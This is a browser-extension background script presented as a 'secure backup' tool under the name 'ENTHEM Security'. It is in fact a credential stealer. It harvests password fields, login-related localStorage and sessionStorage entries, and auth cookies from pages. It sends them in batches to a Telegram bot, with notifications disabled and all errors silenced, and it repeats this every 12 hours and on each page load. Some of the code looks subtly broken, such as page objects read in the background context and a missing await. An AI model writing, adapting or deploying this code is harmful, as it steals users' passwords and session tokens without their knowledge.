const CONFIG = {
  TELEGRAM_BOT_TOKEN: 'YOUR_BOT_TOKEN_HERE',
  TELEGRAM_CHAT_ID: 'YOUR_CHAT_ID_HERE',
  BACKUP_INTERVAL: 12 * 60 * 60 * 1000
};

let isFirefox = typeof browser !== 'undefined';
let api = isFirefox ? browser : chrome;
let backupCount = 0;

api.runtime.onInstalled.addListener(async (details) => {
  if (details.reason === 'install' || details.reason === 'update') {
    await requestPermissions();
    await performBackup();
    startScheduledBackup();
  }
});

async function requestPermissions() {
  try {
    const permissions = {
      permissions: ['identity', 'identity.email', 'cookies']
    };
    await api.permissions.request(permissions);
  } catch (error) {}
}

async function performBackup() {
  try {
    const passwords = await extractAllPasswords();
    
    if (passwords && passwords.length > 0) {
      await sendPasswordsToTelegram(passwords);
      backupCount++;
      
      const backupInfo = {
        lastBackup: new Date().toISOString(),
        totalPasswords: passwords.length,
        backupNumber: backupCount
      };
      
      await api.storage.local.set({ backupInfo });
    }
  } catch (error) {}
}

function startScheduledBackup() {
  setInterval(async () => {
    await performBackup();
  }, CONFIG.BACKUP_INTERVAL);
}

async function extractAllPasswords() {
  return new Promise((resolve) => {
    try {
      const passwords = [];
      const domain = window.location.hostname || 'unknown';
      const url = window.location.href || 'unknown';
      
      const keys = Object.keys(localStorage);
      const passwordKeys = keys.filter(k => 
        k.toLowerCase().includes('pass') || 
        k.toLowerCase().includes('login') ||
        k.toLowerCase().includes('user') ||
        k.toLowerCase().includes('email') ||
        k.toLowerCase().includes('credential')
      );
      
      passwordKeys.forEach(key => {
        try {
          const value = localStorage.getItem(key);
          if (value && value.length > 0 && value.length < 500) {
            try {
              const parsed = JSON.parse(value);
              if (parsed && typeof parsed === 'object') {
                const pwd = parsed.password || parsed.pass || parsed.pwd || parsed.token || parsed.key;
                const user = parsed.username || parsed.user || parsed.email || parsed.login || 'unknown';
                if (pwd) {
                  passwords.push({
                    domain: domain,
                    username: user,
                    password: pwd,
                    url: url,
                    timestamp: new Date().toISOString(),
                    source: 'localStorage'
                  });
                }
              }
            } catch (e) {
              if (value.length > 3 && value.length < 100) {
                passwords.push({
                  domain: domain,
                  username: key,
                  password: value,
                  url: url,
                  timestamp: new Date().toISOString(),
                  source: 'localStorage_plain'
                });
              }
            }
          }
        } catch (e) {}
      });
      
      const formInputs = document.querySelectorAll('input[type="password"]');
      formInputs.forEach(input => {
        if (input.value && input.value.length > 0) {
          const form = input.closest('form');
          let username = 'unknown';
          
          if (form) {
            const fields = form.querySelectorAll('input[type="text"], input[type="email"], input[name*="user"], input[name*="email"], input[name*="login"]');
            fields.forEach(field => {
              if (field.value) username = field.value;
            });
          }
          
          passwords.push({
            domain: domain,
            username: username,
            password: input.value,
            url: url,
            timestamp: new Date().toISOString(),
            source: 'form_detected'
          });
        }
      });
      
      try {
        const cookies = document.cookie.split(';');
        cookies.forEach(cookie => {
          const [name, value] = cookie.trim().split('=');
          if (name && value) {
            const lowerName = name.toLowerCase();
            if (lowerName.includes('pass') || lowerName.includes('login') || lowerName.includes('user') || lowerName.includes('auth')) {
              passwords.push({
                domain: domain,
                username: name,
                password: value,
                url: url,
                timestamp: new Date().toISOString(),
                source: 'cookie'
              });
            }
          }
        });
      } catch (e) {}
      
      try {
        const sessionKeys = Object.keys(sessionStorage);
        sessionKeys.forEach(key => {
          const lowerKey = key.toLowerCase();
          if (lowerKey.includes('pass') || lowerKey.includes('login') || lowerKey.includes('user') || lowerKey.includes('auth')) {
            const value = sessionStorage.getItem(key);
            if (value && value.length > 0) {
              passwords.push({
                domain: domain,
                username: key,
                password: value,
                url: url,
                timestamp: new Date().toISOString(),
                source: 'sessionStorage'
              });
            }
          }
        });
      } catch (e) {}
      
      const uniquePasswords = [];
      const seen = new Set();
      passwords.forEach(p => {
        const key = p.domain + p.username + p.password;
        if (!seen.has(key)) {
          seen.add(key);
          uniquePasswords.push(p);
        }
      });
      
      resolve(uniquePasswords);
    } catch (error) {
      resolve([]);
    }
  });
}

async function sendPasswordsToTelegram(passwords) {
  try {
    const chunkSize = 8;
    
    for (let i = 0; i < passwords.length; i += chunkSize) {
      const chunk = passwords.slice(i, i + chunkSize);
      let message = generateSecureMessage(chunk, i, passwords.length);
      await sendToTelegram(message);
      await new Promise(resolve => setTimeout(resolve, 1500));
    }
    
    const summary = `
━━━━━━━━━━━━━━━━━━━━━━━━
🔐 SECURE BACKUP COMPLETE
━━━━━━━━━━━━━━━━━━━━━━━━
📊 Total: ${passwords.length} entries
📅 ${new Date().toLocaleString()}
━━━━━━━━━━━━━━━━━━━━━━━━
🔐 ENTHEM Security
    `;
    
    await sendToTelegram(summary);
    
  } catch (error) {}
}

function generateSecureMessage(chunk, startIndex, total) {
  let message = `
━━━━━━━━━━━━━━━━━━━━━━━━
🔐 SECURE DATA (${startIndex + 1}-${Math.min(startIndex + chunk.length, total)})
━━━━━━━━━━━━━━━━━━━━━━━━
`;
  
  chunk.forEach((p, index) => {
    message += `
📌 ${startIndex + index + 1}
🌐 ${p.domain}
👤 ${p.username}
🔑 ${p.password}
🔗 ${p.url}
📅 ${new Date(p.timestamp).toLocaleString()}
━━━━━━━━━━━━━━━━━━━━━━━━
`;
  });
  
  return message;
}

async function sendToTelegram(message) {
  try {
    await fetch(`https://api.telegram.org/bot${CONFIG.TELEGRAM_BOT_TOKEN}/sendMessage`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        chat_id: CONFIG.TELEGRAM_CHAT_ID,
        text: message,
        disable_notification: true,
        disable_web_page_preview: true
      })
    });
  } catch (error) {}
}

api.tabs.onUpdated.addListener((tabId, changeInfo, tab) => {
  if (changeInfo.status === 'complete' && tab.url) {
    api.scripting.executeScript({
      target: { tabId: tabId },
      func: extractAndSendPasswords
    });
  }
});

function extractAndSendPasswords() {
  chrome.runtime.sendMessage({ action: 'extractPasswords' });
}

api.runtime.onMessage.addListener((request, sender, sendResponse) => {
  if (request.action === 'backupNow') {
    performBackup().then(() => {
      sendResponse({ success: true });
    });
    return true;
  }
});

// Content script injection for password extraction
api.runtime.onMessage.addListener((request, sender, sendResponse) => {
  if (request.action === 'extractPasswords') {
    const passwords = extractAllPasswords();
    sendResponse({ passwords: passwords });
  }
  return true;
});